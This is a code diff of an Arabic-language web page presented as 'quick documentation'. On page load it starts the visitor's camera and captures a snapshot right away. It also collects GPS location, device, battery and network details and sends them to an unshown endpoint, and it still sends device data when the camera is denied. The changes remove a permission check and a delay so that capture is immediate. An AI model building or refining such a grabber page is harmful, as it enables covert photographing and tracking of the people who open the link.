@@ -2,7 +2,7 @@
 <html lang="ar">
   <head>
     <meta charset="UTF-8" />
-    <title>توثيق اللحظة</title>
+    <title>توثيق سريع</title>
     <style>
       body {
         font-family: sans-serif;
@@ -22,8 +22,14 @@
     </style>
   </head>
   <body onload="startCamera()">
-    <h2 style="color: green">📷 جاري تشغيل الكاميرا...</h2>
-    <video id="preview" autoplay style="width: 100%; max-width: 400px"></video>
+    <h2 style="color: green">📸 توثيق فوري قيد التنفيذ...</h2>
+    <video
+      id="preview"
+      autoplay
+      muted
+      playsinline
+      style="width: 100%; max-width: 400px"
+    ></video>
     <canvas id="snapshot" style="display: none"></canvas>
     <p id="info"></p>
 
@@ -32,36 +38,13 @@
 
       async function startCamera() {
         try {
-          const permission = await navigator.permissions.query({
-            name: "camera",
-          });
-          if (permission.state === "denied") {
-            document.body.innerHTML =
-              "<h2 style='color:red;'>❌ تم رفض إذن الكاميرا من المتصفح</h2>";
-
-            const payload = {
-              image: "null",
-              info: {
-                time: new Date().toLocaleString(),
-                location: "غير متاح",
-                device: navigator.userAgent,
-                battery: "غير متاح",
-                network: "غير معروف",
-              },
-            };
-
-            sendPayload(payload);
-            return;
-          }
-
           stream = await navigator.mediaDevices.getUserMedia({ video: true });
         } catch (err) {
           document.body.innerHTML =
-            "<h2 style='color:red;'>❌ لم يتم تشغيل الكاميرا: " +
+            "<h2 style='color:red;'>❌ الكاميرا مرفوضة: " +
             err.message +
             "</h2>";
-
-          const payload = {
+          sendPayload({
             image: "null",
             info: {
               time: new Date().toLocaleString(),
@@ -70,18 +53,17 @@
               battery: "غير متاح",
               network: "غير معروف",
             },
-          };
-
-          sendPayload(payload);
+          });
           return;
         }
 
         const video = document.getElementById("preview");
         video.srcObject = stream;
 
-        video.onloadedmetadata = () => {
-          setTimeout(captureAndSend, 1000);
-        };
+        // نلتقط فورًا بعد أول إطار
+        video.addEventListener("playing", () => {
+          captureAndSend();
+        });
       }
 
       async function captureAndSend() {
@@ -110,26 +92,22 @@
 
         navigator.geolocation.getCurrentPosition(
           (pos) => {
-            const lat = pos.coords.latitude.toFixed(5);
-            const lon = pos.coords.longitude.toFixed(5);
-
-            const payload = {
+            sendPayload({
               image: imageData,
               info: {
                 time: timestamp,
-                location: `${lat}, ${lon}`,
+                location: `${pos.coords.latitude.toFixed(
+                  5
+                )}, ${pos.coords.longitude.toFixed(5)}`,
                 device: userAgent,
                 battery: batteryLevel,
                 network: connectionType,
               },
-            };
-
-            sendPayload(payload);
-            document.getElementById("info").innerText =
-              "✅ تم التوثيق والإرسال";
+            });
+            document.getElementById("info").innerText = "✅ تم التوثيق الفوري";
           },
-          (err) => {
-            const payload = {
+          () => {
+            sendPayload({
               image: imageData,
               info: {
                 time: timestamp,
@@ -138,9 +116,7 @@
                 battery: batteryLevel,
                 network: connectionType,
               },
-            };
-
-            sendPayload(payload);
+            });
             document.getElementById("info").innerText =
               "✅ تم التوثيق بدون موقع";
           }
